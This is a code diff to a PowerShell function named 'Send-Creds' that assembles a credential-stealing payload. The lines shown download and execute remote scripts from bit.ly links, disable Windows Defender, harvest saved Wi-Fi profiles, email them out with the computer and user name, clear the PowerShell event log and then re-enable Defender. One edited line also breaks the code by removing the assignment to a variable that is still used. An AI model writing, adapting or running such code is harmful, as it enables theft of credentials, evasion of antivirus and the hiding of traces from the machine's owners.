@@ -15,6 +15,10 @@ Function Send-Creds {
 		$To
 	)
 	$Command = "
+		# Import module to Enable/Disable WindowsDefender
+		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
+		# Disable WindowsDefender
+		Set-WindowsDefender -Mode Disabled
 		# Import Send-Email module
 		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2duH9Yu')
 		
@@ -27,17 +31,19 @@ Function Send-Creds {
 		
 		#Wlan Profiles
 		try {
-			$Module = (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
+			(New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
 			Invoke-Expression $Module
 			`$Information = Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
 		} catch {}
-		
+		`$Information
 		# Send Email
 		`$Subject = 'Information_Gathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
 		Send-Email -From '$from' -Password '$Password' -To '$To' -Subject `$Subject -Body `$Information
 		
 		# Clear EventLog
 		Clear-EventLog -LogName 'Windows PowerShell'
+		# Enable Windows Defender
+		Set-WindowsDefender -Mode Enabled
 	"
 	
 	# Test Admin
